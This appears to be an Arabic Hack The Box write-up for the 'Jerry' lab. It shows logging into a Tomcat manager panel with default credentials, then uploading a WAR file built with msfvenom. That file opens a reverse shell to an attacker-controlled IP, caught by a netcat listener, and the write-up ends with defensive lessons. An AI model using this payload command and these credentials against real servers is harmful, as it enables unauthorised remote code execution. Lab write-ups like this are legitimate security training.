# 1️⃣ HTB Jerry Lab - Arabic Hack The Box Report

---
## 📍 Basic Information
- **Category:** Web
- **Difficulty:** Easy
- **HTB Link:** [HTB Academy – Jerry ](https://app.hackthebox.com/machines/Jerry)
- **Date Completed:** 2025-07-28

---

## 🔍 1. Recon & Enumeration

### 🌐 Target Information
- **IP:** 10.10.10.95
- **Ports:** 8080 (HTTP)
- **Service:** Apache Tomcat
- **Technology Identified:** Apache Tomcat
- **OS Guessing:** Windows

### 📄 Files / Endpoints Discovered
- `/docs`
- `/manager/html`
- `/examples`

### 🧪 Tools Used
- `nmap`, `ffuf`, ``msfvenom`` 

---

## 🎯 2. Vulnerability Identification

### ✅ Vulnerability Type(s)
- [x] File Upload Attack
- [x] Weak Credential 

### 🧠 Explanation  
اثناء فحص ال Directories وجدت صفحة تسجيل دخول `manager/html` وهي عبارة عن صفحة تسجيل دخول، قمت بالتسجيل بال username وال password الافتراضيين ل Tomcat، وبالفعل استطعت تسجيل الدخول.

<img width="720" height="348" alt="1" src="https://github.com/user-attachments/assets/a1204625-30cd-4629-9603-19206f0d733b" />


لاحظت بصفحة ال `manager` وجود مكان لرفع ملف `Web Application Resource (WAR)` وهو ملف يحتوي على الملفات المبنية ب Java الضرورية لعمل الموقع.

السماح برفع ملفات `WAR` وتمكين المستخدم من تشغيلها بدون تحقق من التوثيق يمثل خلل أمني يسمح بتنفيذ أوامر عن بعد RCE، وهذا يُصنف كـ `Remote Code Execution`.


---

## 🚀 3. Exploitation

### 🔧 Payload Used

بعد بحث خفيف على Google وجدت ان ممكن انشأ ال payload باستخدام `msvenom` : 

```shell
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.93 LPORT=9002 -f war > rev_shell.war
```

وطبعاً لازم شغل `Listener` عندي باستخدام `Netcat`:

```shell
nc -lnvp 9002
```


---
### 🎯 Result / Effect

بعد ما جهزت ال Listener وانشأت ال Payload، برفعه على الصفحة، بس ما رح يصير شي عندي لانه صح انرفع بس ما تم تفعيله، لهيك لازم اضغط على رابط ال Payload يلي تم انشائه:

<img width="720" height="301" alt="2" src="https://github.com/user-attachments/assets/256f70ac-3268-4b50-a0ca-8755674675c3" />

---

## 📎 4. Proof of Concept (PoC)

### 💬 Steps to Reproduce:

1. افتح `8080:[Your_IP]` وسجل الدخول بـ:
    
2. بعد الدخول، انتقل مباشرة إلى `/manager/html`
    - username: `tomcat`
        
    - password: `s3cret`
        
    
3. لاحظ ممكن رفع ملف war.
    
4. انشأ payload Java وقم برفعه ثم تشغيله.
    

### 🖼️ Screenshot 

<img width="720" height="246" alt="3" src="https://github.com/user-attachments/assets/c5c23473-9313-487a-aff6-a3e79dd3f9c5" />

<img width="831" height="187" alt="4" src="https://github.com/user-attachments/assets/61ed18c6-3998-42eb-97c3-c9a1cba90978" />

---

## 📊 5. Impact & Risk

- **OWASP Category:** A08:2021 - Software and Data Integrity Failures , A05:2021 - Security Misconfiguration
    
- **CVSS Score:** 9.0 (Critical)
    
- **Impact:**  
    يسمح للمستخدمين غير المصرح لهم بالوصول إلى صلاحية ال `Administrator`
    


---

## 🗒️ 7. Lessons Learned

- ضرورة تعطيل واجهات الإدارة (`manager/html`) أو تقييدها عبر جدار ناري داخلي.
    
- تقييد رفع ملفات WAR لمديرين موثوقين فقط.
    
- فحص ملفات WAR باستخدام AV و sandbox قبل النشر.
    

---

## 🔗 References

- [HTB Academy - File Upload Attacks](https://academy.hackthebox.com/module/details/136)
    
- [OWASP A08 – Software and Data Integrity Failuresl](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
    
- [OWASP A05 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
    

---

## **tags:**

#HTB_Repo , #Web , #Bug_Bounty , #File_Upload_Attack
